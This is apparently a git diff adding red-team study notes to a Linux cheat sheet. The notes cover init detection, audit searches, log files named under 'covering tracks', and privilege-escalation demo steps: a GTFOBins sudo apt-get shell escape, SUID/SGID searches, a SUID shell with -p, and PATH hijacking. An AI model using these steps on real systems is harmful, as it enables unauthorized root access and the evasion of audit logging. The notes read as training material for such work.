@@ -365,15 +365,72 @@ SUDO configuration: https://wiki.archlinux.org/index.php/sudo#Configuration
 
 Dangerous commands: https://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/
 
-----------------------------------------------
-| red team field manual                      |
-| linux/unix administrator handbook          |
-| cyber war                                  |
-----------------------------------------------
+|--------------------------------------------|
+| Red Team Field Manual                      |
+| Linux/Unix Administrator Handbook          |
+| Cyber War                                  |
+|--------------------------------------------|
 
+**----------------------------------------------------------------------------------**
+WAYS TO FIGURE OUT INIT TYPE
 
+ls -latr /proc/1/exe
+stat /sbin/init
+man init
+init --version
+ps 1
 
+AUDITING SYSTEMV
 
+ausearch -p 22
+ausearch -m USER_LOGIN -sv no
+ausearch -ua edwards -ts yesterday -te now -i
+
+COMMANDS FOR COVERING TRACKS
+
+auth.log/secure -Logins/authentications
+lastlog -Each users' last successful login time
+btmp -Bad login attempts
+sulog -Usage of SU command
+utmp -Currently logged in users (W command)
+wtmp -Permanent record on user on/off
+
+RSYSLOG
+Newer Rsyslog references: /etc/rsyslog.d/* for settings/rules
+Older version only uses: /etc/rsyslog.conf
+
+Find out
+grep "IncludeConfig" /etc/rsyslog.conf
+xfreerdp /u:<USER> /p:<PASS> /v:<IP>
+
+------------------------## PRIVESC DEMO NOTES ##-------------------------------------
+
+# SUDO DEMO
+
+# LIST SUDO PERMISSIONS
+
+sudo -l
+// checked GTFOBins found this
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+## SUID/SGID
+
+# SUID
+find / -type f -perm /4000 -ls 2>/dev/null
+##SGID 
+find / -type f -perm /2000 -ls 2>/dev/null
+##BOTH
+find / -type f -perm /6000 -ls 2>/dev/null
+
+/home/demo1/nice /bin/sh -p
+
+## . in PATH
+
+echo $PATH
+PATH=.:$PATH //adds pwd to the PATH variable
+
+#!/bin/bash
+<SCRIPT>
 
 
 
